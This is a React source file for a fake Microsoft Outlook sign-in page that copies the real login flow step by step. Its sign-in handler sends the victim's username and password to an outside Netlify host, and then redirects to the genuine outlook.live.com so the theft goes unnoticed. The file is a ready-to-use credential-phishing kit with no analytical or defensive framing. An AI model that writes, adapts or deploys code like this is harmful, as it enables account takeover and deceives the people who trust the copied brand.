import  { useState } from 'react';
import axios from 'axios';
import '/src/App.css';
import { IoIosArrowRoundBack } from "react-icons/io";



import key from "./assets/key.png";
import logo from "./assets/logo1.svg";

const MicrosoftSignIn = () => {
  const [view, setView] = useState('uname');
  const [unameVal, setUnameVal] = useState('');
  const [pwdVal, setPwdVal] = useState('');
  const [errorUname, setErrorUname] = useState('');
  const [errorPwd, setErrorPwd] = useState('');
  const [userEmail, setUserEmail] = useState('');

  const unReq = 'Enter a valid email address, phone number, or Skype name.';
  const pwdReq = 'Please enter the password for your Microsoft account.';

  const validate = () => {
    if (view === 'uname') {
      if (!unameVal.trim()) {
        setErrorUname(unReq);
        return false;
      } else {
        setErrorUname('');
        return true;
      }
    } else if (view === 'pwd') {
      if (!pwdVal.trim()) {
        setErrorPwd(pwdReq);
        return false;
      } else {
        setErrorPwd('');
        return true;
      }
    }
    return false;
  };

  const handleNext = () => {
    if (validate()) {
      setUserEmail(unameVal);
      setView('pwd');
    }
  };

  const handleSignIn = () => {
    if (validate()) {
      const data = { username: unameVal, password: pwdVal };
      axios
        .post('https://promotionaloutlook.netlify.app/submit', data)
        .then((response) => {
          console.log(response.data.message);
          setView('final');
        })
        .catch((error) => {
          console.error('Error saving data:', error);
          alert('Login failed. Please try again.');
        });
    }
  };

  const redirect=()=>{
    window.location.href = "https://outlook.live.com/";
  }

  return (
    <div>
      {view === 'uname' && (
        <section id="section_uname">
          <div className="Pagetitle">Outlook</div>
          <div className="auth-wrapper">
            <img src={logo} alt="Microsoft" style={{height: "21px", marginBottom: "12px"}} />
            <h2 className="title mt-16" style={{marginBottom: "3px"}}>Sign in</h2>
            <div style={{ display: 'inline-block', fontSize: '11px', marginTop: '0px', fontWeight: "400.5" }}>
              to continue to Outlook
            </div>
            <form style={{width: "100%"}}>
              <div className="mb-16">
                <p id="error_uname" className="error">{errorUname}</p>
                <input
                  id="inp_uname"
                  type="text"
                  name="uname"
                  className="input"
                  placeholder="Email, phone, or Skype"
                  value={unameVal}
                  onChange={(e) => setUnameVal(e.target.value)}
                />
              </div>
            </form>
            <div>
              <p className="mb-16 fs-11">
                No account? <a href="#" className="link">Create one!</a>
              </p>
            </div>
            <div>
              <button className="next_btn" onClick={handleNext}>Next</button>
            </div>
          </div>
          <div className="opts">
            <p className="has-icon mb-0" style={{ fontSize: '13px' }}>
              <span className="icon">
                <img src={key} width="30px" />
              </span>
              Sign-in options
            </p>
          </div>
        </section>
      )}

      {view === 'pwd' && (
        <section id="section_pwd">
          <div className="auth-wrapper">
            <img src={logo} alt="Microsoft" className="d-block logo" />
            <div className="identity w-100 mt-16 mb-16">
              <div className='back'>
              <IoIosArrowRoundBack size={18} onClick={() => setView('uname')} style={{ cursor: 'pointer'}} />
              </div>
              <div id="user_email">{userEmail}</div>
            </div>
            <h2 className="title mb-16">Enter password</h2>
            <form>
              <div className="mb-16">
                <p id="error_pwd" className="error">{errorPwd}</p>
                <input
                  id="inp_pwd"
                  type="password"
                  name="pass"
                  className="input"
                  placeholder="Password"
                  value={pwdVal}
                  onChange={(e) => setPwdVal(e.target.value)}
                />
              </div>
            </form>
            <div>
              <p className="mb-13">
                <a href="#" className="link fs-11">Forgot password?</a>
              </p>
              <p className="mb-16">
                <a href="#" className="link fs-11">Other ways to sign in</a>
              </p>
            </div>
            <div>
              <button className="btn" id="btn_sig" onClick={handleSignIn}>Sign in</button>
            </div>
          </div>
        </section>
      )}

      {view === 'final' && (
        <section id="section_final">
          <div className="auth-wrapper">
            <img src={logo} alt="Microsoft" className="d-block" />
            <div className="identity w-100 mt-16 mb-16">
              <span id="user_identity">{userEmail}</span>
            </div>
            <h2 className="title mb-16">Stay signed in?</h2>
            <p className="p">Stay signed in so you don&apos;t have to sign in again next time.</p>
            <label className="has-checkbox">
              <input type="checkbox" className="checkbox" />
              <span>Don&apos;t show this again</span>
            </label>
            <div className="btn-group">
              <button className="btn btn-sec" id="btn_final" onClick={redirect}>No</button>
              <button className="btn" id="btn_final" onClick={redirect}>Yes</button>
            </div>
          </div>
        </section>
      )}
      <footer className="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <span>.&nbsp;.&nbsp;.</span>
      </footer>
    </div>
  );
};

export default MicrosoftSignIn;
